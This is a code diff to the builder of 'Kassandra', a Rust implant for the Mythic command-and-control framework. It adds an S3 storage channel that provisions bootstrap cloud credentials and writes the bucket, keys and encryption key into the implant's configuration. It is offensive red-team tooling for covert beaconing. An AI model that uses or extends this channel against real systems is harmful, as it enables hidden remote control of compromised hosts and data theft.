@@ -20,9 +20,14 @@ class KassandraAgent(PayloadType):
     wrapped_payloads = []                                             # If wrapper, list of wrapper payloads to use
     note = """Basic Implant in Rust"""                                   # Description
     supports_dynamic_loading = False                                  # Support of dynamic code loading
-    c2_profiles = ["http"]                                            # Listener types 
+    c2_profiles = ["http", "s3_storage"]                              # Listener types
+    c2_parameter_deviations = {
+        "s3_storage": {
+            "encrypted_exchange_check": C2ParameterDeviation(supported=False),
+        }
+    }
     mythic_encrypts = False                                           # is the encryption handled by Mythic
-    translation_container = "KassandraTranslator"                          # Translator service name 
+    translation_container = "KassandraTranslator"                          # Translator service name
     build_parameters = [
         BuildParameter(
             name="output",
@@ -39,11 +44,12 @@ class KassandraAgent(PayloadType):
         )
     ]                                             # Array if we want custom parameters during build
     agent_path = pathlib.Path(".") / "Kassandra"                           # Path of Kassandra
-    agent_icon_path = agent_path / "agent_functions" / "Kassandra.svg"     # Path of the icon 
+    agent_icon_path = agent_path / "agent_functions" / "Kassandra.svg"     # Path of the icon
     agent_code_path = agent_path / "agent_code"                       # Path of the agent source code
 
     build_steps = [                                                   # Build steps
         BuildStep(step_name="Gathering Files", step_description="Making sure all commands have backing files on disk"),
+        BuildStep(step_name="Provisioning C2", step_description="Setting up C2 credentials"),
         BuildStep(step_name="Applying configuration", step_description="Stamping in configuration values"),
         BuildStep(step_name="Compiling", step_description="Compiling the agent")
     ]
@@ -65,23 +71,67 @@ class KassandraAgent(PayloadType):
             "proxy_user": "",
             "proxy_pass": "",
         }
+
+        # S3 config (populated if s3_storage C2 profile is selected)
+        s3_config = None
+        use_s3 = False
+        enc_key = None
+
         stdout_err = ""
         for c2 in self.c2info:
             profile = c2.get_c2profile()
-            for key, val in c2.get_parameters_dict().items():
-                if isinstance(val, dict) and 'enc_key' in val:
-                    stdout_err += "Setting {} to {}".format(key, val["enc_key"] if val["enc_key"] is not None else "")
-                    encKey = base64.b64decode(val["enc_key"]) if val["enc_key"] is not None else ""
-                else:
-                    Config[key] = val
+            profile_name = profile["name"]
+
+            if profile_name == "s3_storage":
+                use_s3 = True
+                params = c2.get_parameters_dict()
+                killdate = params.get("killdate", None)
+                Config["callback_interval"] = params.get("callback_interval", "5")
+                Config["callback_jitter"] = params.get("callback_jitter", "10")
+
+                # Handle AESPSK parameter
+                aespsk_param = params.get("AESPSK", None)
+                enc_key = None
+                if isinstance(aespsk_param, dict):
+                    if aespsk_param.get("value") == "aes256_hmac":
+                        enc_key = aespsk_param.get("enc_key", None)
+                elif isinstance(aespsk_param, str) and aespsk_param not in ("none", ""):
+                    enc_key = aespsk_param
+
+                # Call s3_storage generate_config RPC to provision bootstrap credentials
+                config_data = await SendMythicRPCOtherServiceRPC(MythicRPCOtherServiceRPCMessage(
+                    ServiceName="s3_storage",
+                    ServiceRPCFunction="generate_config",
+                    ServiceRPCFunctionArguments={
+                        "payload_uuid": self.uuid,
+                        "killdate": killdate,
+                        "enc_key": enc_key,
+                    }
+                ))
+
+                if not config_data.Success:
+                    resp.status = BuildStatus.Error
+                    resp.build_stderr = f"S3 provisioning failed: {config_data.Error}"
+                    return resp
+
+                s3_config = config_data.Result
+
+            elif profile_name == "http":
+                for key, val in c2.get_parameters_dict().items():
+                    if isinstance(val, dict) and 'enc_key' in val:
+                        stdout_err += "Setting {} to {}".format(key, val["enc_key"] if val["enc_key"] is not None else "")
+                        encKey = base64.b64decode(val["enc_key"]) if val["enc_key"] is not None else ""
+                    else:
+                        Config[key] = val
             break
 
-        if "https://" in Config["callback_host"]:
-            Config["ssl"] = True
+        if not use_s3:
+            if "https://" in Config["callback_host"]:
+                Config["ssl"] = True
+            Config["callback_host"] = Config["callback_host"].replace("https://", "").replace("http://","")
+            if Config["proxy_host"] != "":
+                Config["proxyEnabled"] = True
 
-        Config["callback_host"] = Config["callback_host"].replace("https://", "").replace("http://","")
-        if Config["proxy_host"] != "":
-            Config["proxyEnabled"] = True
         # create the payload
         await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                 PayloadUUID=self.uuid,
@@ -89,31 +139,78 @@ class KassandraAgent(PayloadType):
                 StepStdout="Found all files for payload",
                 StepSuccess=True
             ))
+
+        # Report C2 provisioning
+        if use_s3 and s3_config:
+            key_preview = s3_config["access_key_id"][:8] + "..."
+            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                PayloadUUID=self.uuid,
+                StepName="Provisioning C2",
+                StepStdout=(
+                    f"S3 Storage C2 provisioned\n"
+                    f"Bucket: {s3_config['bucket']}\n"
+                    f"Payload Prefix: {s3_config['payload_prefix']}/\n"
+                    f"Region: {s3_config['region']}\n"
+                    f"Bootstrap Key: {key_preview}\n"
+                    f"Encryption: {'AES-256-CBC + HMAC-SHA256 (EKE)' if enc_key else 'disabled'}\n"
+                    f"Mode: Runtime per-execution IAM provisioning\n"
+                    f"Bootstrap Permissions: PUT .req, GET/DELETE .creds (register/ only)"
+                ),
+                StepSuccess=True,
+            ))
+        else:
+            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                PayloadUUID=self.uuid,
+                StepName="Provisioning C2",
+                StepStdout="HTTP C2 - no additional provisioning needed",
+                StepSuccess=True,
+            ))
+
         agent_build_path = tempfile.TemporaryDirectory(suffix=self.uuid)
         copy_tree(str(self.agent_code_path), agent_build_path.name)
-        
+
 
         config_path = pathlib.Path(agent_build_path.name) / "kassandra" / "src" / "config.rs"
         with open(config_path, "r+") as f:
             content = f.read()
             content = content.replace("%UUID%", Config["payload_uuid"])
-            content = content.replace("%HOSTNAME%", Config["callback_host"])
-            content = content.replace("%ENDPOINT%", Config["post_uri"])
-            content = content.replace("%PORT%", str(Config["callback_port"]))
-            content = content.replace("%USERAGENT%", Config["USER_AGENT"])
-            content = content.replace("%PROXYURL%", Config["proxy_host"])
-            content = content.replace("%SLEEPTIME%", str(Config["callback_interval"]))
-            content = content.replace("%JITTER%", str(Config["callback_jitter"]))
+            content = content.replace("%HOSTNAME%", Config.get("callback_host", ""))
+            content = content.replace("%ENDPOINT%", Config.get("post_uri", ""))
+            content = content.replace("%PORT%", str(Config.get("callback_port", "80")))
+            content = content.replace("%USERAGENT%", Config.get("USER_AGENT", ""))
+            content = content.replace("%PROXYURL%", Config.get("proxy_host", ""))
+            content = content.replace("%SLEEPTIME%", str(Config.get("callback_interval", "5")))
+            content = content.replace("%JITTER%", str(Config.get("callback_jitter", "10")))
             content = content.replace("%CHUNKSIZE%", str(self.get_parameter("chunk_size")))
-            content = content.replace("%SSL%", "true" if Config["ssl"] else "false")
-            content = content.replace("%PROXYENABLED%", "true" if Config["proxyEnabled"] else "false")
+            content = content.replace("%SSL%", "true" if Config.get("ssl") else "false")
+            content = content.replace("%PROXYENABLED%", "true" if Config.get("proxyEnabled") else "false")
+
+            # S3 config stamping
+            if use_s3 and s3_config:
+                content = content.replace("%USE_S3%", "true")
+                content = content.replace("%S3_ENDPOINT%", s3_config["s3_endpoint"])
+                content = content.replace("%S3_BUCKET%", s3_config["bucket"])
+                content = content.replace("%S3_PAYLOAD_PREFIX%", s3_config["payload_prefix"])
+                content = content.replace("%S3_BOOTSTRAP_ACCESS_KEY_ID%", s3_config["access_key_id"])
+                content = content.replace("%S3_BOOTSTRAP_SECRET_ACCESS_KEY%", s3_config["secret_access_key"])
+                content = content.replace("%S3_REGION%", s3_config["region"])
+                content = content.replace("%AESPSK%", enc_key if enc_key else "")
+            else:
+                content = content.replace("%USE_S3%", "false")
+                content = content.replace("%S3_ENDPOINT%", "")
+                content = content.replace("%S3_BUCKET%", "")
+                content = content.replace("%S3_PAYLOAD_PREFIX%", "")
+                content = content.replace("%S3_BOOTSTRAP_ACCESS_KEY_ID%", "")
+                content = content.replace("%S3_BOOTSTRAP_SECRET_ACCESS_KEY%", "")
+                content = content.replace("%S3_REGION%", "")
+                content = content.replace("%AESPSK%", "")
 
             f.seek(0)
             f.write(content)
             f.truncate()
-            f.flush()                 # push Python’s buffers
+            f.flush()                 # push Python's buffers
             os.fsync(f.fileno())      # push OS buffers
-    
+
         await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
             PayloadUUID=self.uuid,
             StepName="Applying configuration",
